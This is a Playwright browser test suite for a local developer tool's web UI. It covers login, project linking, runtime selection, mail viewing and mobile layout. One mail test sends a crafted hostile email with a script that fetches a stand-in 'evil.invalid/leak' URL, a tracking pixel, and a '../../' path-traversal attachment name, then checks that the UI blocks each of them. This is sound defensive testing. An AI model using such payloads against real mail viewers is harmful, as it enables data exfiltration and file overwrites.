import { test, expect, type Page } from "@playwright/test";
import { spawn, execFileSync, type ChildProcess } from "node:child_process";
import {
  mkdtempSync,
  mkdirSync,
  readFileSync,
  existsSync,
  rmSync,
  chmodSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { createServer } from "node:net";
const binary = resolve(process.env.VELNIX_UI_BINARY ?? "../bin/velnix");
async function port(): Promise<number> {
  const s = createServer();
  return new Promise((done, reject) => {
    s.once("error", reject);
    s.listen(0, "127.0.0.1", () => {
      const p = (s.address() as { port: number }).port;
      s.close(() => done(p));
    });
  });
}
type Fixture = {
  root: string;
  env: NodeJS.ProcessEnv;
  origin: string;
  secret: string;
  bootstrapFile: string;
  child: ChildProcess;
  children: ChildProcess[];
  run: (args: string[]) => any;
};
async function childReady(
  args: string[],
  env: NodeJS.ProcessEnv,
  event: string,
): Promise<{ child: ChildProcess; ready: any }> {
  const child = spawn(binary, args, { env, stdio: ["ignore", "pipe", "pipe"] });
  let text = "",
    errors = "";
  return new Promise((done, reject) => {
    const timer = setTimeout(() => {
      child.kill("SIGKILL");
      reject(new Error("Disposable CLI readiness timeout: " + errors));
    }, 12_000);
    child.stderr!.on("data", (chunk) => (errors += chunk.toString()));
    child.once("exit", (code) => {
      clearTimeout(timer);
      reject(new Error(`Disposable CLI exited ${code}: ${errors}`));
    });
    child.stdout!.on("data", (chunk) => {
      text += chunk.toString();
      for (const line of text.split("\n")) {
        try {
          const ready = JSON.parse(line);
          if (ready.event === event) {
            clearTimeout(timer);
            done({ child, ready });
            return;
          }
        } catch {}
      }
    });
  });
}
async function setup(): Promise<Fixture> {
  const root = mkdtempSync(join(tmpdir(), "velnix-ui-browser-"));
  chmodSync(root, 0o700);
  mkdirSync(join(root, "runtime"), { mode: 0o700 });
  const env = {
    ...process.env,
    HOME: root,
    XDG_CONFIG_HOME: join(root, "config"),
    XDG_DATA_HOME: join(root, "data"),
    XDG_STATE_HOME: join(root, "state"),
    XDG_CACHE_HOME: join(root, "cache"),
    XDG_RUNTIME_DIR: join(root, "runtime"),
  };
  const run = (args: string[]) =>
    JSON.parse(
      execFileSync(binary, [...args, "--json"], {
        env,
        encoding: "utf8",
        timeout: 15_000,
      }),
    );
  const uiPort = await port();
  const args = ["ui", "--port", String(uiPort)];
  const plan = run(args);
  const { child, ready } = await childReady(
    [...args, "--approve", plan.id, "--json"],
    env,
    "ui_ready",
  );
  const secret = readFileSync(ready.bootstrap_file, "utf8").trim();
  return {
    root,
    env,
    run,
    origin: ready.address,
    secret,
    bootstrapFile: ready.bootstrap_file,
    child,
    children: [child],
  };
}
async function teardown(f: Fixture) {
  for (const child of f.children.reverse()) {
    if (child.exitCode === null && child.signalCode === null) {
      await new Promise<void>((done) => {
        const timer = setTimeout(() => child.kill("SIGKILL"), 6_000);
        child.once("exit", () => {
          clearTimeout(timer);
          done();
        });
        child.kill("SIGINT");
      });
    }
  }
  rmSync(f.root, { recursive: true, force: true });
}
async function login(page: Page, f: Fixture) {
  await page.goto(f.origin);
  await page.getByLabel("One-time login secret").fill(f.secret);
  await page
    .getByRole("button", { name: "Open workspace", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "Your workspace, in focus." }),
  ).toBeVisible();
}
async function apply(page: Page) {
  await expect(page.getByRole("dialog")).toBeVisible();
  await page.getByRole("button", { name: "Apply this exact plan" }).click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await expect(
    page
      .getByRole("status")
      .filter({ hasText: "The reviewed change was applied." }),
  ).toBeVisible();
}
async function initialized(page: Page) {
  await page.getByRole("button", { name: "Review initialization" }).click();
  await apply(page);
}
async function navigate(page: Page, label: string, mobile = false) {
  if (mobile)
    await page.getByRole("button", { name: "Open navigation" }).click();
  await page
    .getByRole("navigation", { name: "Workspace" })
    .getByRole("link", { name: label, exact: true })
    .click();
}
async function link(page: Page, name: string, path: string) {
  await page.getByRole("button", { name: "Link project", exact: true }).click();
  await page.getByLabel("Project name", { exact: true }).fill(name);
  await page.getByLabel("Absolute project path").fill(path);
  await page.getByRole("button", { name: "Review link", exact: true }).click();
  await apply(page);
}

test("desktop: authentication, pages, exact changes, stale review and runtime selection", async ({
  page,
}, info) => {
  const f = await setup();
  const outside: string[] = [],
    errors: string[] = [],
    violations: string[] = [];
  let reads = 0;
  page.on("request", (r) => {
    if (new URL(r.url()).pathname.startsWith("/api/")) reads++;
  });
  page.on("pageerror", (e) => errors.push(e.message));
  await page.exposeFunction("recordCSP", (v: string) => violations.push(v));
  await page.addInitScript(() =>
    document.addEventListener("securitypolicyviolation", (e) =>
      (window as any).recordCSP(e.violatedDirective),
    ),
  );
  await page.route("**/*", (route) => {
    const url = route.request().url();
    if (!url.startsWith("about:") && new URL(url).origin !== f.origin) {
      outside.push(url);
      return route.abort();
    }
    return route.continue();
  });
  try {
    expect(
      (await page.request.get(f.origin + "/api/read/overview")).status(),
    ).toBe(401);
    await page.setViewportSize({ width: 1440, height: 1000 });
    await login(page, f);
    expect(existsSync(f.bootstrapFile)).toBe(false);
    await initialized(page);
    const project = join(f.root, "atlas-api");
    mkdirSync(project, { mode: 0o700 });
    await navigate(page, "Projects");
    await link(page, "atlas-api", project);
    await expect(
      page.getByRole("heading", { name: "atlas-api", exact: true }),
    ).toBeVisible();
    const second = join(f.root, "sandbox-site");
    mkdirSync(second, { mode: 0o700 });
    // Reopen the form, preview a change, then mutate the registry via CLI.
    await page
      .getByRole("button", { name: "Link project", exact: true })
      .click();
    await page.getByLabel("Project name", { exact: true }).fill("sandbox-site");
    await page.getByLabel("Absolute project path").fill(second);
    await page
      .getByRole("button", { name: "Review link", exact: true })
      .click();
    const external = join(f.root, "cli-linked");
    mkdirSync(external, { mode: 0o700 });
    const linkArgs = [
      "projects",
      "link",
      "--name",
      "cli-linked",
      "--path",
      external,
    ];
    const linkPlan = f.run(linkArgs);
    f.run([...linkArgs, "--approve", linkPlan.id]);
    await page.getByRole("button", { name: "Apply this exact plan" }).click();
    await expect(page.getByRole("alert")).toContainText(
      /changed|preview|plan/i,
    );
    await expect(
      page.getByRole("heading", { name: "sandbox-site", exact: true }),
    ).toHaveCount(0);
    await navigate(page, "Runtimes");
    await page
      .getByRole("combobox", { name: "Project", exact: true })
      .selectOption("atlas-api");
    await page
      .getByRole("combobox", { name: "Runtime", exact: true })
      .selectOption("python");
    const python = "/usr/bin/python3";
    const pythonVersion = execFileSync(python, ["-I", "-S", "--version"], {
      encoding: "utf8",
    })
      .trim()
      .replace("Python ", "");
    await page.getByLabel("Absolute executable path").fill(python);
    await page.getByLabel("Exact installed version").fill(pythonVersion);
    await page.getByRole("button", { name: "Review selection" }).click();
    await expect(page.getByRole("dialog")).toContainText(
      "may execute the exact selected native binary",
    );
    await apply(page);
    await expect(
      page.getByText("python " + pythonVersion, { exact: false }),
    ).toBeVisible();
    await page
      .getByRole("button", { name: "Review clearing python for atlas-api" })
      .click();
    await apply(page);
    for (const label of ["Owned services", "Certificates", "Diagnostics"]) {
      await navigate(page, label);
      await expect(page.locator("h1")).toBeVisible();
    }
    await navigate(page, "Overview");
    await page.screenshot({
      path: info.outputPath("overview-desktop.png"),
      fullPage: true,
      animations: "disabled",
    });
    await page.getByRole("button", { name: "Use dark theme" }).click();
    await page.screenshot({
      path: info.outputPath("overview-dark.png"),
      fullPage: true,
      animations: "disabled",
    });
    await page.reload();
    await expect(
      page.getByRole("heading", { name: "Your workspace, in focus." }),
    ).toBeVisible();
    const settledReads = reads;
    await page.waitForTimeout(1200);
    expect(reads).toBe(settledReads);
    expect(
      await page.evaluate(() => ({
        local: localStorage.length,
        session: sessionStorage.length,
        cookie: document.cookie.includes("velnix_session"),
      })),
    ).toEqual({ local: 0, session: 0, cookie: false });
    expect(outside).toEqual([]);
    expect(errors).toEqual([]);
    expect(violations).toEqual([]);
    await page.getByRole("button", { name: "Sign out", exact: true }).click();
    await expect(page.getByText("Signed out. Restart velnix ui")).toBeVisible();
    expect(
      (await page.request.get(f.origin + "/api/read/overview")).status(),
    ).toBe(401);
  } finally {
    await teardown(f);
  }
});

test("mail: passive hostile-message viewing, protected attachment download and prune review", async ({
  page,
}, info) => {
  test.skip(
    !process.env.VELNIX_TEST_MAILPIT,
    "Set VELNIX_TEST_MAILPIT for disposable real-provider browser acceptance",
  );
  const f = await setup();
  const outside: string[] = [];
  page.on("request", (request) => {
    if (new URL(request.url()).origin !== f.origin) outside.push(request.url());
  });
  try {
    await login(page, f);
    await initialized(page);
    // Start an isolated approved mail session, never the user's existing inbox.
    const smtp = await port(),
      api = await port();
    const args = [
      "mail",
      "serve",
      "--mailpit",
      process.env.VELNIX_TEST_MAILPIT!,
      "--smtp-port",
      String(smtp),
      "--api-port",
      String(api),
    ];
    const p = f.run(args);
    const captured = await childReady(
      [...args, "--approve", p.id, "--json"],
      f.env,
      "mail_ready",
    );
    f.children.push(captured.child);
    execFileSync("/usr/bin/python3", [
      "-c",
      `import smtplib,sys\nfrom email.message import EmailMessage\nm=EmailMessage();m['From']='sender@example.test';m['To']='receiver@example.test';m['Subject']='Browser acceptance';m.set_content('Private plain-text message');m.add_alternative('<script>fetch("https://evil.invalid/leak")</script><img src="https://evil.invalid/pixel">',subtype='html');m.add_attachment(b'\\x00\\x01\\xff',maintype='application',subtype='octet-stream',filename='../../safe.bin')\nwith smtplib.SMTP('127.0.0.1',int(sys.argv[1])) as c:c.send_message(m)`,
      String(smtp),
    ]);
    await navigate(page, "Mail");
    await page.getByRole("button", { name: /Browser acceptance/ }).click();
    await expect(
      page.getByText("Private plain-text message", { exact: true }),
    ).toBeVisible();
    expect(await page.locator("iframe").count()).toBe(0);
    const downloadPromise = page.waitForEvent("download");
    await page.getByRole("link", { name: /safe.bin/ }).click();
    const download = await downloadPromise;
    expect(download.suggestedFilename()).toBe("safe.bin");
    expect(readFileSync((await download.path())!).toString("hex")).toBe(
      "0001ff",
    );
    await page.getByRole("button", { name: "Review retention prune" }).click();
    await expect(page.getByRole("dialog")).toContainText("irreversible");
    await page.getByRole("button", { name: "Cancel", exact: true }).click();
    await page.screenshot({
      path: info.outputPath("mail-desktop.png"),
      fullPage: true,
      animations: "disabled",
    });
    expect(outside).toEqual([]);
  } finally {
    await teardown(f);
  }
});

test("mobile: local login, navigation, review cancellation, focus and no horizontal overflow", async ({
  page,
}, info) => {
  const f = await setup();
  try {
    await page.setViewportSize({ width: 390, height: 844 });
    await login(page, f);
    await page.getByRole("button", { name: "Review initialization" }).click();
    await expect(page.getByRole("dialog")).toBeVisible();
    await page.keyboard.press("Escape");
    await expect(page.getByRole("dialog")).toHaveCount(0);
    await expect(
      page.getByRole("button", { name: "Review initialization" }),
    ).toBeFocused();
    await initialized(page);
    for (const label of [
      "Projects",
      "Runtimes",
      "Owned services",
      "Certificates",
      "Mail",
      "Diagnostics",
      "Overview",
    ]) {
      await navigate(page, label, true);
      await expect(page.locator("h1")).toBeVisible();
      expect(
        await page.evaluate(
          () => document.documentElement.scrollWidth <= window.innerWidth,
        ),
      ).toBe(true);
      await expect
        .poll(async () => {
          const b = await page.locator(".sidebar").boundingBox();
          return b ? b.x + b.width : 0;
        })
        .toBeLessThanOrEqual(1);
    }
    await page.screenshot({
      path: info.outputPath("overview-mobile.png"),
      fullPage: true,
      animations: "disabled",
    });
  } finally {
    await teardown(f);
  }
});
